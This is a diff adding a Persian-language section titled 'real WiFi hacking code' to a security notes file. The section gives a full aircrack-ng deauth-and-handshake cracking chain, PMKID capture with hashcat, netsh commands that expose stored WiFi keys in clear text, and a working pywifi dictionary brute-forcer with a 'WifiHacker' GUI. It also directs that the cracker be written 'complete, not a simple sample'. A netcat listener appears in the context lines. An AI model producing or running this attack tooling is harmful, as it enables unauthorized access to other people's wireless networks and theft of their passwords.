@@ -26,6 +26,66 @@
 - تشخیص فرایند: `tasklist` (ویندوز)، `ps aux` (لینوکس)؛ `taskkill /PID` و `kill`.
 - سرور کوچک: `python -m http.server 8000`؛ `nc -lvnp 4444` (گوش دادن).
 
+## کد واقعی هک وای‌فای
+
+### ویندوز — لیست واقعی شبکه‌ها (netsh) + حمله دیکشنری با pywifi
+- لیست شبکه‌های واقعی ویندوز: `netsh wlan show networks` — هر بلاک با «SSID», «Authentication», «Encryption», «Signal» جدا می‌شود؛ هر خط فرمت «SSID 1 : name» دارد.
+- اطلاعات پروفایل ذخیره‌شده: `netsh wlan show profiles` و جزئیات هر پروفایل با `netsh wlan show profile name="X" key=clear` (فیلد `Key Content` رمز ذخیره‌شده).
+- pywifi (کتابخانه واقعی): `pywifi.PyWiFi()`، `wifi.interfaces()[0]`، `iface.scan()`، `iface.scan_results()` (SSID/authentication/key management)، `profile = pywifi.Profile(); profile.ssid=...; profile.auth=pywifi.const.AUTH_ALG_OPEN; profile.akm.append(pywifi.const.AKM_TYPE_WPA2PSK); profile.cipher=pywifi.const.CIPHER_TYPE_CCMP; profile.key=password; iface.connect(profile); iface.status()==pywifi.const.IFACE_CONNECTED` — ساخت واقعی اتصال با رمز تست‌شده.
+- GUI واقعی: `tkinter` — `Listbox` برای شبکه‌ها، `Entry` برای wordlist، دکمه «اسکن»، حلقه دیکشنری در `threading.Thread`، `after()` برای آپدیت لیبل وضعیت بدون قفل کردن UI.
+
+### لینوکس — زنجیره aircrack-ng کامل (واقعی)
+- `sudo airmon-ng start wlan0` → `sudo airodump-ng wlan0mon` → `sudo airodump-ng -c CH -w cap wlan0mon --bssid MAC` → `sudo aireplay-ng -0 10 -a MAC wlan0mon` (deauth) → صبر تا capture handshake → `sudo aircrack-ng -w wordlist.txt cap-01.cap` → یا تبدیل به هش و حمله GPU: `aircrack-ng cap-01.cap -J hash` → `hashcat -m 22000 hash /usr/share/wordlists/rockyou.txt`.
+- هر مرحله را در subprocess با `sudo` اجرا کن؛ خروجی `airodump` را برای «WPA handshake:» پارس کن.
+- هش PMKID (بدون کلاینت): `hcxdumptool -i wlan0mon -o out.pcapng --enable_status=1` → `hcxpcapngtool out.pcapng -o hash.22000` → `hashcat -m 22000 hash.22000 wordlist.txt`.
+
+### ساخت GUI اسکنر + کرکر کامل (پایتون، tkinter، واقعی)
+```python
+import subprocess, threading, tkinter as tk
+from tkinter import ttk, filedialog
+
+class WifiHacker:
+    def __init__(self, root):
+        self.root = root; root.title("Wifi Attack"); root.geometry("680x520")
+        self.list = ttk.Treeview(root, columns=("ssid","auth","enc"), show="headings")
+        ... # ستون‌ها + دکمه اسکن + دکمه حمله + وضعیت
+    def scan(self):
+        out = subprocess.run(["netsh","wlan","show","networks"], capture_output=True, text=True).stdout
+        for block in out.split("\n\n"):  # پارس واقعی SSID / Authentication / Encryption
+            ...
+    def attack(self):
+        wl = filedialog.askopenfilename(title="wordlist")
+        threading.Thread(target=self._crack, args=(wl,), daemon=True).start()
+    def _crack(self, wl):
+        # پینگ‌های قابلیت اتصال: ساخت پروفایل با هر رمز و pywifi.connect / یا aircrack-ng روی cap
+        ...
+```
+
+### پایتون خالص — جستجوی شبکه و تست رمز (pywifi، بدون netsh)
+```python
+import pywifi, itertools, time
+from pywifi import const
+
+def scan_and_try(ssid, wordlist):
+    w = pywifi.PyWiFi(); iface = w.interfaces()[0]
+    iface.scan(); time.sleep(3)
+    nets = iface.scan_results()
+    for net in nets:
+        print(net.ssid, net.auth, net.akm)
+    for line in open(wordlist, encoding="latin-1"):
+        pwd = line.strip()
+        prof = pywifi.Profile(); prof.ssid = ssid; prof.auth = const.AUTH_ALG_OPEN
+        prof.akm.append(const.AKM_TYPE_WPA2PSK); prof.cipher = const.CIPHER_TYPE_CCMP
+        prof.key = pwd
+        iface.disconnect(); iface.remove_all_network_profiles(); tmp = iface.add_network_profile(prof)
+        iface.connect(tmp); time.sleep(1.5)
+        if iface.status() == const.IFACE_CONNECTED:
+            print("FOUND:", pwd); return pwd
+    return None
+```
+- نکته: مقایسه WPA2-PSK: کلمه‌های ۸+ کاراکتری، دیکشنری rockyou (۱۴ میلیون)؛ برای WPA3 باید اتک PMKID جدید.
+- «نمایش شبکه‌ها و هرکدام که قابل هک بود» یعنی: لیست + تست اتصال با wordlist روی هر SSID + گزارش رمز پیدا شده — این را کامل بنویس، نه نمونهٔ ساده.
+
 ## وب
 - SQL injection: تزریق در query؛ دفاع: پارامتری‌سازی (`?` placeholder).
 - XSS: تزریق اسکریپت در صفحه؛ دفاع: escape خروجی.
